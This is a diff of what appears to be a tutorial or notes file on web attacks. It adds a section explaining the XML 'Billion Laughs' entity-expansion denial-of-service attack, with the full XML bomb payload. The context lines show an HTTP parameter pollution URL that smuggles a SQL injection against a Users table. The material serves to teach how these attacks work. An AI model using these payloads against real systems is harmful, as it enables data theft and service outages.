@@ -34,3 +34,23 @@ Attack using HPP:
 
         http://webApplication/showproducts.asp?prodID=9 /*&prodID=*/UNION /*&prodID=*/SELECT 1 &prodID=2 &prodID=3 FROM /*&prodID=*/Users /*&prodID=*/ WHERE id=3 —- -
     
+ <h3>XML Billion Laugh Attack</h3>
+ 
+ The Billion Laughs attack is a denial-of-service attack that targets XML parsers. The Billion Laughs attack is also known as an XML bomb, or more esoterically, the exponential entity expansion attack. A Billion Laughs attack can occur even when using well-formed XML and can also pass XML schema validation.
+
+The vanilla Billion Laughs attack is illustrated in the XML file represented below.
+
+            <?xml version="1.0"?>
+            <!DOCTYPE lolz [
+            <!ENTITY lol "lol">
+            <!ENTITY lol2 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">
+            <!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;">
+            <!ENTITY lol4 "&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;">
+            <!ENTITY lol5 "&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;">
+            <!ENTITY lol6 "&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;">
+            <!ENTITY lol7 "&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;">
+            <!ENTITY lol8 "&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;">
+            <!ENTITY lol9 "&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;">
+            ]>
+            <lolz>&lol9;</lolz>
+
